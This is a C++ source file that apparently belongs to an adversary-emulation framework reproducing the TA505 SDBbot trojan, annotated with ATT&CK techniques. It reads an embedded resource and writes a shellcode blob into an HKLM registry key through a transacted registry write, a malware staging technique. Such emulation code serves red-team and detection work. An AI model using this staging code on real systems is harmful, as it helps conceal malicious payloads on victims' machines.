#include "shellcode.hpp"
#include "registry.hpp"
#include "transactions.hpp"
#include <format>

using common::windows_error, common::unique_handle;
using std::expected, std::unexpected, std::wstring_view, std::span, std::byte;

/*
 * read_resource:
 *      About:
 *          Fetches the specified resource using the FindResourceW, LoadResource, LockResource,
 *          and SizeofResource API calls.
 *      Result:
 *          Resource bytes, or error on failure
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 */
expected<span<byte>, windows_error>
read_resource(int id, HMODULE pe) {
    HRSRC info = ::FindResourceW(
        pe,
        MAKEINTRESOURCEW(id),
        MAKEINTRESOURCEW(10)
    );
    if (nullptr == info) {
        return unexpected(common::get_last_error(std::format(
            "Could not find resource {}",
            id
        )));
    }

    HGLOBAL res = ::LoadResource(pe, info);
    if (nullptr == res) {
        return unexpected(common::get_last_error(std::format(
            "Could not load resource {}",
            id
        )));
    }

    auto buffer = static_cast<byte*>(::LockResource(res));
    if (nullptr == buffer) {
        return unexpected(common::get_last_error(std::format(
            "Resource {} is unavailable",
            id
        )));
    }

    DWORD size = ::SizeofResource(pe, info);
    if (0 == size) {
        return std::unexpected(common::get_last_error(std::format(
            "Could not determine size of resource {}",
            id
        )));
    }

    return span<byte>{ buffer, buffer + size };
}

/*
 * register_shellcode_transacted:
 *      About:
 *          Writes the given shellcode blob data to the specified registry location using the
 *          RegCreateKeyTransactedW and RegSetKeyValueW API calls.
 *      Result:
 *          Shellcode blob written to registry, or error on failure
 *      MITRE ATT&CK Techniques:
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 *          https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
 */
expected<HANDLE, windows_error>
register_shellcode_transacted(
    HANDLE transaction,
    wstring_view key,
    wstring_view value,
    span<byte> data
) {
    auto handle = common::create_registry_key(
        transaction,
        key,
        KEY_WRITE,
        HKEY_LOCAL_MACHINE
    );
    if (!handle) {
        return unexpected(handle.error());
    }

    auto write = common::write_registry(handle.value().get(), value, data);
    if (!write) {
        return unexpected(write.error());
    }

    return transaction;
}
